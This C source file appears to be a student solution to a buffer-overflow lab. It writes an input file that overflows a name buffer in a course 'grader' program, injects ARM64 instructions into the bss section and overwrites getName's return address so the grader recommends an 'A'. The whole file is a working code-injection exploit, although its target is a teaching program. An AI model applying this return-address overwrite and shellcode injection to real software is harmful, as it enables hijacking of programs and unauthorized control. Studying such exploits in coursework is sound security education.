/*--------------------------------------------------------------------*/
/* createdataA.c                                                      */
/* Author: Alex Luo, Rohan Amin                                       */
/*--------------------------------------------------------------------*/

#include <stdio.h>
#include "miniassembler.h"

/* This function takes no command-line arguments and does not read from 
   any streams. It writes to a file dataA, creating a file that, when 
   piped to the grader program, will cause the grader program to 
   recommend a "A" grade for "Rohan Alex". It then returns 0. */

int main(void) {
   FILE *psFile;
   int i;
   unsigned int mov, adr, strb, branch, movLocation; 
   psFile = fopen("dataA", "w");

   /* Puts names in buf array */ 
   fputs("Rohan Alex",psFile);

   /* Filler with null bytes up to machine language instruction */
   for (i = 0; i < 22; i++)
      putc('\0', psFile);

   /* MiniAssembler machine language instructions to place
      'A' into grade variable:
         mov x0, 'A'
         adr x1, 0x420044 (location of grade)
         strb x0, [x1]
         b 0x400864 (printf call)
      */ 
   mov = MiniAssembler_mov(0, 'A');
   adr = MiniAssembler_adr(1,0x420044,0x42007c) ;
   strb = MiniAssembler_strb(0, 1); 
   branch = MiniAssembler_b(0x400864,0x420084);

   /* Location of start of machine code in bss section */ 
   movLocation = 0x420078;

   /* Write in the machine code instructions into the file */ 
   fwrite(&mov, sizeof(unsigned int), 1, psFile);
   fwrite(&adr, sizeof(unsigned int), 1, psFile);
   fwrite(&strb, sizeof(unsigned int), 1, psFile);
   fwrite(&branch, sizeof(unsigned int), 1, psFile);

   /* Overwrites getName return address to that of start of machine code*/ 
   fwrite (&movLocation, sizeof(unsigned int), 1, psFile); 
   fclose(psFile);
   return 0; 

}
